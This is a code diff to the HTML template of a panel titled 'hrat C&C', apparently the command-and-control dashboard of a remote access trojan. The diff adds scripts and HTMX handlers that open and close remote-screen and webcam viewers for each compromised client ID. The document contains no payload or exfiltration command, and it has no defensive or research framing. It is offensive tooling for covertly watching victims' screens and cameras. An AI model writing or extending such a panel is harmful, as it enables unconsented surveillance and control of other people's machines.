@@ -6,6 +6,8 @@
         <title>hrat C&C</title>
         <script src="https://cdn.tailwindcss.com"></script>
         <script src="https://unpkg.com/htmx.org@1.9.10"></script>
+        <script src="/static/remote_screen.js" defer></script>
+        <script src="/static/webcam.js" defer></script>
         <style>
             @import url("https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap");
 
@@ -350,5 +352,58 @@
                 </div>
             </div>
         </div>
+
+        <!-- HTMX Event Handlers for Component Initialization -->
+        <script>
+            document.body.addEventListener("htmx:afterSwap", function (evt) {
+                // Auto-initialize components after HTMX swaps
+                const target = evt.target;
+
+                // Initialize remote screen components
+                const screenCanvases = target.querySelectorAll(
+                    '[id^="screen-canvas-"]',
+                );
+                screenCanvases.forEach((canvas) => {
+                    const clientId = canvas.id.replace("screen-canvas-", "");
+                    console.log("Initializing remote screen for:", clientId);
+                    window.initRemoteScreen(clientId);
+                });
+
+                // Initialize webcam components
+                const webcamCanvases = target.querySelectorAll(
+                    '[id^="webcam-canvas-"]',
+                );
+                webcamCanvases.forEach((canvas) => {
+                    const clientId = canvas.id.replace("webcam-canvas-", "");
+                    console.log("Initializing webcam for:", clientId);
+                    window.initWebcam(clientId);
+                });
+            });
+
+            // Cleanup before swapping components
+            document.body.addEventListener("htmx:beforeSwap", function (evt) {
+                const target = evt.target;
+
+                // Cleanup remote screen connections
+                const screenCanvases = target.querySelectorAll(
+                    '[id^="screen-canvas-"]',
+                );
+                screenCanvases.forEach((canvas) => {
+                    const clientId = canvas.id.replace("screen-canvas-", "");
+                    console.log("Cleaning up remote screen for:", clientId);
+                    window.cleanupRemoteScreen(clientId);
+                });
+
+                // Cleanup webcam connections
+                const webcamCanvases = target.querySelectorAll(
+                    '[id^="webcam-canvas-"]',
+                );
+                webcamCanvases.forEach((canvas) => {
+                    const clientId = canvas.id.replace("webcam-canvas-", "");
+                    console.log("Cleaning up webcam for:", clientId);
+                    window.cleanupWebcam(clientId);
+                });
+            });
+        </script>
     </body>
 </html>
